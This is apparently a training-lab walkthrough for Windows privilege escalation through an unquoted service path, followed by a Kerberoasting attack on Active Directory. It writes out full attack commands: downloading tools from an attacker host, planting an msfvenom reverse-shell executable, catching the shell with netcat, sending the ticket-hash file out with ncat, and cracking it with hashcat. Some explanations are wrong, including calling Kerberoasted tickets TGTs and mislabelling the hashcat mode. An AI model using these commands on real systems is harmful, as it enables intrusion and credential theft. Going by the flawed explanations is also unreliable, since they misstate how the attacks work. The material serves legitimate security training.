
WinPEASx64.exe is a tool for Windows privilege escalation, identifying misconfigurations and vulnerabilities for potential exploitation

The Unquoted Service Path vulnerability in the RunOnce registry key arises when a Windows service path lacks proper quotation marks and contains spaces, enabling attackers to execute arbitrary code with elevated privileges during system startup

To perform further attacks, we need high privileges. For privilege escalation, we will use WinPEAS.exe to enumerate any misconfigurations

We will upload the WinPEAS.exe file and execute it in Windows

Move to C:\ using the command **cd C:\**

Next, move to **C:\Users\Public\Downloads** using **cd** and execute the command **powershell**

Now, we need to host winPEASx64.exe on the attacker machine using Python. Open a new terminal, type **sudo su**, press **Enter**, and use **toor** as password. Execute the command **cd /root/ADtools**

Type **python3 -m http.server** and press **Enter** to host the **winPEASx64.exe** file

Get back to the shell terminal and type **wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe**

Once winpeas.exe is downloaded, execute it with **./winpeas.exe**

Once the execution is completed, observe the output. Here, we have a file named **file.exe** in **C:\Program Files\CEH Services** that is unquoted and can be exploited for privilege escalation
  
Open a new terminal with root privileges using the command sudo su and **toor** as password. Execute the **msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe** command

Get back to our shell terminal and move to C:\Program Files\CEH Services. Execute the command **cd ../../.. ; cd "Program Files/CEH Services"**

Execute the command **move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe**

Now, go to another terminal and type **nc -nvlp 8888** and press **Enter**

 
Click on [Windows Server 2019 (AD)](https://labclient.labondemand.com/Instructions/6b4befec-cb8e-49ba-859b-1b45da779221#) to switch to the Windows Server 2019 (AD) machine, assuming we are the victim now. Restart the machine by hovering over **Power and Display** button and click **Reset/Reboot** button present at the toolbar located above the virtual machine and log in with the username **SQL_srv** and password "**batman**."

After logging in, switch back to the [Parrot Security](https://labclient.labondemand.com/Instructions/6b4befec-cb8e-49ba-859b-1b45da779221#). Here, we got the shell to our netcat listener. Which is a privileged shell.

## Perform Kerberoasting Attack


Rubeus is a tool for exploiting Kerberos weaknesses in Windows environments. Kerberoasting is a method to extract ticket granting ticket (TGT) hashes from AD. Attackers target service accounts with associated Kerberos service principal names (SPNs). TGTs are requested from the DC for these accounts, then cracked offline to reveal user passwords. Kerberoasting exploits weak service account passwords and the nature of Kerberos authentication

In the netcat shell, execute the **powershell** command to launch PowerShell

Navigate to C:\Users\Public\Downloads and execute the command **cd ../.. ; cd Users\Public\Downloads**

Now, we will be downloading Rubeus and netcat. Execute the command 
**wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe 
wget http://10.10.1.13:8000/ncat.exe -o ncat.exe**. 
Once the tools are downloaded type **exit** and press **Enter**

Type **cd ../.. && cd Users\Public\Downloads** and press **Enter** to move into the Downloads folder

Execute the command **rubeus.exe kerberoast /outfile:hash.txt**

After kerberoasting the password hash for **DC-Admin** is saved in **hash.txt** file

To get that hash file on the attacker machine, we will be using netcat. Open a new terminal, type **sudo su** and press **Enter**; use **toor** as password. Then execute the command **nc -lvp 9999 > hash.txt**

In the shell terminal, execute the command **ncat.exe -w 3 10.10.1.13 9999 < hash.txt**

Get back to the netcat listener terminal and press **Enter** to save the file
  
Now, we will be using HashCat to crack the password hash. Execute the command **hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt**

- -m 13100: This specifies the hash type. 13100 corresponds to Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), a specific format for Kerberos hashes.
- --force: This option forces Hashcat to ignore warnings and run even if there are compatibility issues. Use this with caution, as it might cause instability or incorrect results.
- -a 0: This specifies the attack mode. 0 stands for a straight attack, which is a simple dictionary attack where Hashcat tries each password in the dictionary as it is.
- hash.txt: is the input file containing the hashes to crack
- /root/ADtools/rockyou.txt: is the wordlist file used for the attack

After completation, we get the password **advanced!**. As DC-Admin has high privileges on the domain, we can use this password for further attacks

